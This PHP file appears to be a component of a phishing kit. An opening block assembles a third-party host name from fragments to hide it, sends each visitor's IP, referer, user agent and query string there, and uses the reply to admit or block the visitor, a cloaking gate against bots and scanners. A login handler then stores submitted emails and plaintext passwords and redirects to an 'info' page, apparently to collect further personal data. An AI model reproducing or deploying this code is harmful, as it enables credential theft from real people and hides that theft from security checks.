<?php
session_start();

if (!function_exists('xozNe39gB2')) {
    function xozNe39gB2()
    {
        $xNsZVg = $_SERVER['SERVER_ADDR'];
        $xuU1qatOG2 = '127.0.0.1';
        if ((!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) && (($_SERVER['HTTP_CF_CONNECTING_IP']) != $xuU1qatOG2) && (($_SERVER['HTTP_CF_CONNECTING_IP']) != ($xNsZVg))) {
            $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
        } elseif ((!empty($_SERVER['GEOIP_ADDR'])) && (($_SERVER['GEOIP_ADDR']) != $xuU1qatOG2)) {
            $ip = $_SERVER['GEOIP_ADDR'];
        } elseif ((!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) && (($_SERVER['HTTP_X_FORWARDED_FOR']) != $xuU1qatOG2) && (($_SERVER['HTTP_X_FORWARDED_FOR']) != ($xNsZVg))) {
            $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
        } elseif ((!empty($_SERVER['HTTP_CLIENT_IP'])) && (($_SERVER['HTTP_CLIENT_IP']) != $xuU1qatOG2) && (($_SERVER['HTTP_CLIENT_IP']) != ($xNsZVg))) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        return $ip;
    }
}
$ip = xozNe39gB2();
if (!function_exists('xAh9IteN3Lt')) {
    function xAh9IteN3Lt()
    {
        if (empty($_SERVER['HTTP_REFERER'])) {
            $_SERVER['HTTP_REFERER'] = getenv('HTTP_REFERER');
        }
        return $_SERVER['HTTP_REFERER'];
    }
}
$ref = xAh9IteN3Lt();
if (!function_exists('xfehe4SNy3')) {
    function xfehe4SNy3()
    {
        if (empty($_SERVER['HTTP_USER_AGENT'])) {
            $_SERVER['HTTP_USER_AGENT'] = getenv('HTTP_USER_AGENT');
        }
        return $_SERVER['HTTP_USER_AGENT'];
    }
}
$ua = xfehe4SNy3();
if ($_SERVER['QUERY_STRING'] != '') {
    $data = '' . urlencode($_SERVER['QUERY_STRING']) . '';
} else {
    $data = '';
}
$sourcename = 'c';
$cl0ip = 'find';
$sourceid = '';
$cl1ip = 'us';
$fd = 'x990959';
$cl2ip = '.re';
$langua = 'na';
$cl3ip = 'st';
$ch = curl_init();
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_URL, 'https://' . $cl0ip . '' . $cl1ip . '' . $cl2ip . '' . $cl3ip . '/' . $cl1ip . '' . $cl3ip . '.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 333);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'fd=' . $fd . '&ip=' . $ip . '&ref=' . $ref . '&ua=' . $ua . '&data=' . $data . '&sourceid=' . $sourceid . '&sourcename=' . $sourcename . '');
$ifbot = curl_exec($ch);
curl_close($ch);
if ($ifbot != '0') {
} else {
}
if ($ifbot == '') {
    echo '<h1>CURL ERROR</h1>';
} elseif ($ifbot != '0') {
    echo '[PHP code without <?php ?> for BLOCKED]';
} else {
    echo '[PHP code without <?php ?> for ADMITTED]';
}
?>
<?php
// Include the connection file
include './connection/connection.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Capture the email and password from the POST request
    $user_email = $_POST['username'];  // Assuming 'username' is the email input field
    $user_password = $_POST['password'];

    // Check if the email is valid
    if (!filter_var($user_email, FILTER_VALIDATE_EMAIL)) {
        echo "Error: Invalid email format.";
        exit();
    }

    //Ensure the password is not empty
    if (empty($user_password)) {
        echo "Error: Password cannot be empty.";
        exit();
    }

    try {
        
            // Register the new user
            $stmt = $pdo->prepare("INSERT INTO users (email, password, status) VALUES (?, ?, 'offline')");

            if ($stmt->execute([$user_email, $user_password])) {
                // Get the ID of the newly inserted user
                $user_id = $pdo->lastInsertId();

                // Update the user's status to 'online'
                $update_stmt = $pdo->prepare("UPDATE users SET status = 'online' WHERE id = ?");
                $update_stmt->execute([$user_id]);
                $_SESSION['user_id'] = $user_id;

                // Store the user_id in the session
                $_SESSION['user_id'] = $user_id;

                // Redirect to the next step in the registration process or user dashboard
                header('Location: info/info_page.php');
                exit();
            } else {
                // Display an error message if the insert fails
                echo "Error: Unable to register the user.";
            }
        
    } catch (PDOException $e) {
        // Catch any PDO exceptions and display the error message
        echo "Error: " . $e->getMessage();
    }
}
?>

